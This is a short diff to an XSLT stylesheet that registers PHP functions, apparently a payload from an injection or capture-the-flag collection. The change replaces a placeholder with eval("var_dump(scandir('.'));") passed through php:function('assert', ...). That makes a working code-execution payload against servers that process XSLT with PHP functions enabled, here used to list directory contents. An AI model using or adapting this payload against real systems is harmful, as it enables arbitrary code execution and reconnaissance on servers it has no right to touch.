@@ -4,7 +4,7 @@
      xmlns:php="http://php.net/xsl">
 <xsl:template match="/">
 <xsl:variable name="eval">
-        aa("var_dump(scandir('.'));")
+        eval("var_dump(scandir('.'));")
 </xsl:variable>
 <xsl:variable name="preg" select="php:function('assert',$eval)"/>
 </xsl:template></xsl:stylesheet>
